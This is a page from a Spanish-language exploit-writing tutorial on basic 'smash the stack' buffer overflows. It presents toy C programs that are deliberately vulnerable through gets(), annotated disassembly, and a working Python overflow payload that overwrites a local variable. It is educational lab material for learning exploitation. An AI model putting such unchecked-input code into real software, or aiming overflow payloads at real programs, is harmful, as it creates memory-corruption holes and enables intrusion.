<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/poole.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/syntax.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> <a href="https://github.com/fundacion-sadosky/guia-escritura-exploits/blob/master/LICENSE">GNU GPL</a> | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="ataque-smash-the-stack">Ataque “Smash the stack”</h1>
<p>El objetivo de los ejercicios de este apartado es lograr que al ejecutar el programa se imprima el mensaje “you win!”, para lo cual se seguirán diferentes estrategias.</p>

<h2 id="análisis-del-programa-vulnerable">Análisis del programa vulnerable</h2>
<h3 id="stack-1">Stack 1</h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">cookie</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
        
        <span class="n">printf</span><span class="p">(</span><span class="s">"buf: %08x cookie: %08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">);</span>
        <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="mh">0x41424344</span><span class="p">)</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"you win!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="qué-hace-el-programa">¿Qué hace el programa?</h3>
<p>Se declaran dos variables locales <code class="highlighter-rouge">cookie</code> (numérica) y <code class="highlighter-rouge">buf</code> (array de char o, en C, string). <code class="highlighter-rouge">gets()</code> toma datos de la entrada estándar y los guarda en <code class="highlighter-rouge">buf</code>, <code class="highlighter-rouge">cookie</code> no se inicializa pero se evalúa si su valor es <code class="highlighter-rouge">0x41424344</code> (“ABCD” en ASCII), si es así se imprime el mensaje ganador.</p>

<p>Compilamos y ejecutamos el programa con los <a href="/guia-escritura-exploits/configuracion.md">flags necesarios</a>  y vemos su funcionamiento:</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@u:~$</span> gcc <span class="nt">-m32</span> <span class="nt">-fno-stack-protector</span> <span class="nt">-ggdb</span> <span class="nt">-mpreferred-stack-boundary</span><span class="o">=</span>2 <span class="nt">-z</span> execstack <span class="nt">-o</span> stack1 stack1.c
<span class="gp">user@u:~$</span> ./stack1
<span class="go">buf: bffff5b4 cookie: bffff604
</span><span class="gp">user@u:~$</span>
</code></pre></div></div>
<p>Se imprime la dirección de las variables locales y se espera una entrada del usuario. Ingresamos cualquier entrada y el programa finaliza.</p>

<h3 id="layout-de-la-pila-antes-del-exploit">Layout de la pila antes del exploit:</h3>
<p>Antes de ejecutar <code class="highlighter-rouge">gets(buf)</code> el mapa de la pila del programa es el siguiente:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
           <span class="kt">int</span> <span class="n">cookie</span><span class="p">;</span>
           <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
           
           <span class="n">printf</span><span class="p">(</span><span class="s">"buf: %08x cookie: %08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">);</span>
<span class="n">eip</span> <span class="o">=&gt;</span>     <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
   
           <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="mh">0x41424344</span><span class="p">)</span>
              <span class="n">printf</span><span class="p">(</span><span class="s">"you win!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/stack1/layout-pila.png" alt="pila" /></p>

<p>Si pensamos de manera simplificada el <a href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html#punto-de-entrada-del-binario-_start">punto de entrada de un binario</a>,  dentro de <code class="highlighter-rouge">_start</code> se hace un <code class="highlighter-rouge">call main()</code>. La instrucción <code class="highlighter-rouge">call</code> apila la dirección de retorno (para que luego de ejecutar <code class="highlighter-rouge">main()</code>se retorne a <code class="highlighter-rouge">_start</code>) y se apila el frame pointer actual (<code class="highlighter-rouge">ebp</code>), cuyo valor se almacena porque se va a adecuar al frame de <code class="highlighter-rouge">main()</code>. Acto seguido se pasa el control a la función llamada <code class="highlighter-rouge">main()</code> que apila primero la variable local <code class="highlighter-rouge">cookie</code> y después <code class="highlighter-rouge">buf</code>.</p>

<p>Si tenemos en mente la convención del llamado a funciones es posible saber en qué parte de la pila se encuentran los valores que nos interesan:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="err">]</span>  <span class="o">=</span> <span class="n">buf</span>
<span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="err">]</span>   <span class="o">=</span> <span class="n">cookie</span>
<span class="p">[ebp]</span>       <span class="o">=</span> <span class="n">ebp</span> <span class="n">anterior</span> <span class="n">guardado</span>
<span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>   <span class="o">=</span> <span class="n">direcci</span><span class="err">ó</span><span class="n">n</span> <span class="n">de</span> <span class="n">retorno</span>
</code></pre></div></div>

<h3 id="el-programa-desensamblado">El programa desensamblado</h3>
<p>Como lo compilamos con <code class="highlighter-rouge">gcc -g</code>, se puede desensamblar el programa intercalado con el código fuente con <code class="highlighter-rouge">objdump -M intel -S stack1</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span><span class="err">@</span><span class="n">u</span><span class="o">:~</span><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="o">-</span><span class="n">ggdb</span> <span class="o">-</span><span class="n">mpreferred</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">boundary</span><span class="o">=</span><span class="mi">2</span> <span class="o">-</span><span class="n">z</span> <span class="n">execstack</span> <span class="o">-</span><span class="n">o</span> <span class="n">stack1</span> <span class="n">stack1</span><span class="p">.</span><span class="n">c</span>

<span class="n">user</span><span class="err">@</span><span class="n">u</span><span class="o">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="o">-</span><span class="n">S</span> <span class="n">stack1</span>


<span class="mi">0804845</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;:</span>
<span class="o">/*</span> <span class="n">stack1</span><span class="o">-</span><span class="n">stdin</span><span class="p">.</span><span class="n">c</span>                               <span class="o">*</span>
 <span class="o">*</span> <span class="n">specially</span> <span class="n">crafted</span> <span class="n">to</span> <span class="n">feed</span> <span class="n">your</span> <span class="n">brain</span> <span class="n">by</span> <span class="n">gera</span> <span class="err">*/</span>

<span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>

<span class="k">int</span> <span class="n">main</span><span class="p">()</span> <span class="err">{</span>
 <span class="mi">804845</span><span class="n">b</span><span class="o">:</span> <span class="mi">55</span>                    <span class="k">push</span>   <span class="n">ebp</span>
 <span class="mi">804845</span><span class="n">c</span><span class="o">:</span> <span class="mi">89</span> <span class="n">e5</span>                 <span class="k">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
 <span class="mi">804845</span><span class="n">e</span><span class="o">:</span> <span class="mi">83</span> <span class="n">ec</span> <span class="mi">54</span>              <span class="k">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x54</span>                  <span class="c">; local vars </span>
  
  <span class="k">int</span> <span class="n">cookie</span><span class="c">;</span>
  <span class="n">char</span> <span class="n">buf</span><span class="p">[80]</span><span class="c">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"buf: %08x cookie: %08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">)</span><span class="c">;</span>
  <span class="mi">8048461</span><span class="o">:</span> <span class="mi">8</span><span class="n">d</span> <span class="mi">45</span> <span class="n">fc</span>              <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="err">]</span>
  <span class="mi">8048464</span><span class="o">:</span> <span class="mi">50</span>                    <span class="k">push</span>   <span class="n">eax</span>                      <span class="c">; param 3 [ebp-0x4]  | addr cookie</span>
  <span class="mi">8048465</span><span class="o">:</span> <span class="mi">8</span><span class="n">d</span> <span class="mi">45</span> <span class="n">ac</span>              <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="err">]</span>
  <span class="mi">8048468</span><span class="o">:</span> <span class="mi">50</span>                    <span class="k">push</span>   <span class="n">eax</span>                      <span class="c">; param 2 [ebp-0x54] | addr buf</span>
  <span class="mi">8048469</span><span class="o">:</span> <span class="mi">68</span> <span class="mi">30</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>        <span class="k">push</span>   <span class="mh">0x8048530</span>                <span class="c">; param 1 | "buf: %08x cookie: %08x\n"</span>
  <span class="mi">804846</span><span class="n">e</span><span class="o">:</span> <span class="n">e8</span> <span class="mi">9</span><span class="n">d</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>        <span class="k">call</span>   <span class="mi">8048310</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>     <span class="c">; call printf</span>
  <span class="mi">8048473</span><span class="o">:</span> <span class="mi">83</span> <span class="n">c4</span> <span class="mi">0</span><span class="n">c</span>              <span class="k">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
  
  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="c">;</span>
  <span class="mi">8048476</span><span class="o">:</span> <span class="mi">8</span><span class="n">d</span> <span class="mi">45</span> <span class="n">ac</span>              <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="err">]</span>           <span class="c">; param [ebp-0x54] | addr buf</span>
  <span class="mi">8048479</span><span class="o">:</span> <span class="mi">50</span>                    <span class="k">push</span>   <span class="n">eax</span>
  <span class="mi">804847</span><span class="n">a</span><span class="o">:</span> <span class="n">e8</span> <span class="n">a1</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>        <span class="k">call</span>   <span class="mi">8048320</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>       <span class="c">; call gets</span>
  <span class="mi">804847</span><span class="n">f</span><span class="o">:</span> <span class="mi">83</span> <span class="n">c4</span> <span class="mi">04</span>              <span class="k">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>

  <span class="n">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="mh">0x41424344</span><span class="p">)</span>
  <span class="mi">8048482</span><span class="o">:</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">fc</span>              <span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="err">]</span>  <span class="c">; [ebp-0x4]: cookie</span>
  <span class="mi">8048485</span><span class="o">:</span> <span class="mi">3</span><span class="n">d</span> <span class="mi">44</span> <span class="mi">43</span> <span class="mi">42</span> <span class="mi">41</span>        <span class="k">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x41424344</span>           <span class="c">; ¿cookie == 0x41424344?</span>
  <span class="mi">804848</span><span class="n">a</span><span class="o">:</span> <span class="mi">75</span> <span class="mi">0</span><span class="n">d</span>                 <span class="k">jne</span>    <span class="mi">8048499</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0x3e</span><span class="o">&gt;</span>      <span class="c">; ¿Zflag == 1?</span>
     
     <span class="n">printf</span><span class="p">(</span><span class="s">"you win!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span><span class="c">;</span>
     <span class="mi">804848</span><span class="n">c</span><span class="o">:</span> <span class="mi">68</span> <span class="mi">48</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>        <span class="k">push</span>   <span class="mh">0x8048548</span>             <span class="c">; "you win!"</span>
     <span class="mi">8048491</span><span class="o">:</span> <span class="n">e8</span> <span class="mi">9</span><span class="n">a</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>        <span class="k">call</span>   <span class="mi">8048330</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>    <span class="c">; call printf</span>
     <span class="mi">8048496</span><span class="o">:</span> <span class="mi">83</span> <span class="n">c4</span> <span class="mi">04</span>              <span class="k">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
<span class="err">}</span>
 <span class="mi">8048499</span><span class="o">:</span> <span class="n">c9</span>                    <span class="k">leave</span>  
 <span class="mi">804849</span><span class="n">a</span><span class="o">:</span> <span class="n">c3</span>                    <span class="k">ret</span> 
</code></pre></div></div>

<blockquote>
  <p><strong>Consideraciones</strong></p>
  <ul>
    <li><strong>lea vs mov</strong>:   <br />
En el programa aparece la instrucción <code class="highlighter-rouge">lea</code> (en inglés Load Effective Address) que carga una dirección (dada por el operando fuente) en dónde indique el operando destino y funciona de manera similar al operador de dirección “&amp;” en C. En el programa aparece de la siguiente forma: <code class="highlighter-rouge">lea eax,[ebp-0x4]</code>. En esta instrucción se recupera la dirección de <code class="highlighter-rouge">cookie</code> en la pila y se la almacena en <code class="highlighter-rouge">eax</code>.  <br />
Por su uso similar a <code class="highlighter-rouge">mov</code>, es posible confundirse. Con <code class="highlighter-rouge">lea eax,[ebp-0x4]</code> no se dereferencia <code class="highlighter-rouge">ebp-0x4</code> como puntero sino que sólo se está calculando la dirección de <code class="highlighter-rouge">ebp-0x4</code> para almacenarla en el primer operando. En cambio una instrucción como <code class="highlighter-rouge">mov eax,[ebp-0x4]</code> sí considera a su segundo operando un puntero y se copia el valor al que éste apunta.</li>
  </ul>
</blockquote>

<blockquote>
  <ul>
    <li>
      <p><strong>Directivas de tamaño: DWORD.</strong>   <br />
  En el ejemplo anterior la instrucción <code class="highlighter-rouge">mov    eax, DWORD PTR [ebp-0x4]</code> al especificar el segundo operando incluye una directiva de tamaño <code class="highlighter-rouge">DWORD</code> que implica que lo que se debe copiar a <code class="highlighter-rouge">eax</code> son 32 bits.  Las diferentes directivas de tamaño están especificadas en el gráfico del manual de Intel a continuación:</p>

      <p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/stack1/tipo-dato.png" alt="tipo de datos" /></p>

      <p>Si lo pensaramos en C un <code class="highlighter-rouge">char</code> es un <code class="highlighter-rouge">BYTE</code> (8 bits), un <code class="highlighter-rouge">short</code> es una <code class="highlighter-rouge">WORD</code> (16 bits), un <code class="highlighter-rouge">int</code> es una <code class="highlighter-rouge">DOUBLE WORD</code> (32 bits) y un <code class="highlighter-rouge">double</code> es un <code class="highlighter-rouge">QUAD WORD</code> (64 bits).</p>
    </li>
  </ul>
</blockquote>

<h3 id="cuál-es-la-vulnerabilidad-en-gets">¿Cuál es la vulnerabilidad en <code class="highlighter-rouge">gets()</code>?</h3>
<p>Consultamos <code class="highlighter-rouge">man gets</code>:</p>
<blockquote>
  <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"> user@u:~$</span> man gets     
<span class="gp"> char *gets(char *s);</span>     
<span class="go">"gets() lee caracteres desde stdin en el array apuntado por s, 
hasta encontrar un caracter de línea nueva o un caracter de final de fichero (EOF). 
Cualquier carácter de línea nueva es descartado, y reemplazado por un carácter nulo."
"BUGS: Nunca usar gets() porque no es posible controlar cuántos caracteres va a leer de stdin y, 
por lo tanto, es peligroso ya que puede almacenar caracteres por fuera del fin del buffer. 
Es preferible usar fgets()".
</span></code></pre></div>  </div>
  <p>Es una función que lee caracteres por entrada estándar pero no verifica la longitud de lo que almacena respecto al espacio del búfer donde se lo va a almacenar.</p>
</blockquote>

<h2 id="ataque-smash-the-stack-básico">Ataque “Smash the stack” básico</h2>
<p>El ataque conocido como <strong><em>Smash the stack</em></strong> publicado por Aleph One en la revista <a href="http://phrack.org/issues/49/14.html">Phrack</a> consiste en corromper la pila de ejecución de un programa vulnerable escribiendo por fuera de los límites de un búfer. Este ataque consiste en aprovechar una vulnerabilidad del tipo “buffer overflow” o desbordamiento de un búfer almacenado en la pila. Un programa con una función vulnerable (del tipo <code class="highlighter-rouge">gets()</code> que no chequea el tamaño de un búfer) permite escribir en el búfer más datos que los que éste puede contener. Si abusamos de la vulnerabilidad y escribirmos datos que superan el tamaño del búfer logramos desbordarlo y escribir por fuera de los límites de ese bloque de memoria.</p>

<p>En este ataque básico el objetivo será a través de una corrupción de la pila modificar una variable local (<code class="highlighter-rouge">cookie</code> con el valor <code class="highlighter-rouge">0x41424344</code> lograr imprimir el mensaje ganador). No obstante las posibilidades que brinda la escritura por fuera de los límites del búfer no se reducen a ello. Más adelante se verá cómo lo primordial que querremos escribir fuera de los límites del búfer va a ser información de control como la dirección de retorno.</p>

<p>Entonces en el Stack 1 la “corrupción” de la pila tendrá como objetivo particular sobreescribir la variable local <code class="highlighter-rouge">cookie</code> con el valor <code class="highlighter-rouge">0x41424344</code> para que la condición que lo evalúa sea verdadera y se imprima el mensaje ganador “you win!”. Como se indicó la función <code class="highlighter-rouge">gets(buf)</code> nunca evalúa la cantidad de caracteres de <code class="highlighter-rouge">buf</code> por lo que es posible escribir la pila por fuera de los límites de <code class="highlighter-rouge">buf</code> hasta sobreescribir <code class="highlighter-rouge">cookie</code> con el valor deseado.</p>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/stack1/exploit.png" alt="exploit" /></p>

<p>Para eso, primero calculamos la cantidad de caracteres exacta que debemos ingresar por entrada estándar.   <br />
Con el mapa de la pila en la memoria, entendemos que primero debemos ingresar un dato cualquiera hasta completar los 80 bytes de <code class="highlighter-rouge">buf</code> y  los siguientes 4 bytes van a sobreescribir el contenido de <code class="highlighter-rouge">cookie</code>.   <br />
Como el caracter “A” en ASCII es un byte (<code class="highlighter-rouge">\x41</code>) lo usamos de relleno 80 veces, seguido del valor de <code class="highlighter-rouge">cookie</code> deseado.</p>

<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@u:~$</span> python <span class="nt">-c</span> <span class="s1">'print ("A" * 80 + "\x44\x43\x42\x41")'</span> | ./stack1 
<span class="go">buf: bffff5b4 cookie: bffff604
you win!
</span></code></pre></div></div>
<p>Y logramos imprimir el mensaje ganador.   <br />
A medida que los exploits se complejicen será de utilidad armar un archivo en Python con el exploit que funcionará como input: <code class="highlighter-rouge">exploit.py</code>.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="n">output</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">80</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x44\x43\x42\x41</span><span class="s">"</span>
<span class="k">print</span> <span class="n">output</span>
</code></pre></div></div>
<p>Y al ejecutar el programa con ese input logramos el mismo resultado:</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> python exploit.py |./stack1
<span class="go">buf: bffff5b4 cookie: bffff604
you win!
</span></code></pre></div></div>

<blockquote>
  <p><strong>Consideraciones</strong>:</p>
  <ul>
    <li>Si utilizamos <code class="highlighter-rouge">gdb</code> a la hora de debugear el programa es importante tener en cuenta las <a href="/guia-escritura-exploits/configuracion.md#direcciones-en-la-pila-con-y-sin-modo-debugging">diferencias en las direcciones al ejecutar un programa y al debugearlo con <code class="highlighter-rouge">gdb</code></a> para lograr los resultados esperados.</li>
    <li>Cuando debugeamos con <a href="/guia-escritura-exploits/herramientas.md#debugger-gdb"><code class="highlighter-rouge">gdb</code></a> es posible ingresar un input por stdin al programa vulnerable de la siguiente manera:
      <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@u:~$</span> python exploit.py <span class="o">&gt;</span> <span class="k">in</span>
<span class="gp">user@u:~$</span> gdb ./stack1
<span class="go">GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
</span><span class="c">...
</span><span class="go">(gdb) r &lt; in
buf: bffff5b4 cookie: bffff604
you win!
</span></code></pre></div>      </div>
    </li>
  </ul>
</blockquote>

<h3 id="layout-de-la-pila-después-del-exploit">Layout de la pila después del exploit:</h3>
<p>Gráficamente logramos el siguiente resultado:</p>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/stack1/programa-explotado.png" alt="exploit" /></p>

<h3 id="cómo-seguir">¿Cómo seguir?</h3>
<ol>
  <li><strong>Stack 2</strong></li>
  <li><strong>Stack 3</strong></li>
</ol>

<h4 id="código-fuente-stack-2">Código fuente Stack 2</h4>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">cookie</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"buf: %08x cookie: %08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">);</span>
        <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="mh">0x01020305</span><span class="p">)</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"you win!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="código-fuente-stack-3">Código fuente Stack 3</h4>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">cookie</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"buf: %08x cookie: %08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">);</span>
        <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="mh">0x01020005</span><span class="p">)</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"you win!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="material-consultado">Material consultado</h3>
<p>[1]. Aleph One. (Noviembre de 1996). Smashing the Stack for Fun and Profit. <em>Phrack</em>, 7. Disponible en: http://phrack.org/issues/49/14.html</p>


</div>

    </div>

  </body>
</html>
